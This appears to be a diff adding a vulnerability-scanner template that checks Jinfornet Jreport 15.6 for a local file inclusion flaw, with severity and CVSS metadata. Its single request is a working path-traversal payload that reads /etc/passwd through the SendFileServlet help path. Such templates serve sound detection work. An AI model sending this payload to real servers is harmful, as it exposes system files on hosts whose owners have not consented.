@@ -1,0 +1,32 @@
+http:
+- matchers:
+  - part: body
+    regex:
+    - root:[x*]:0:0
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/jreport/sendfile/help/../../../../../../../../../../../../../../etc/passwd'
+id: jinfornet-jreport-lfi
+info:
+  author: 0x_Akoko
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  description: Jinfornet Jreport 15.6 is vulnerable to local file incluion via the
+    Jreport Help function in the SendFileServlet. Exploitaiton allows remote unauthenticated
+    users to view any files on the Operating System with Application services user
+    permission. This vulnerability affects Windows and Unix operating systems.
+  metadata:
+    max-request: 1
+  name: Jinfornet Jreport 15.6 - Local File Inclusion
+  reference:
+  - https://cxsecurity.com/issue/WLB-2020030151
+  - https://www.jinfonet.com/product/download-jreport/
+  severity: high
+  tags: jreport,jinfornet,lfi,vuln
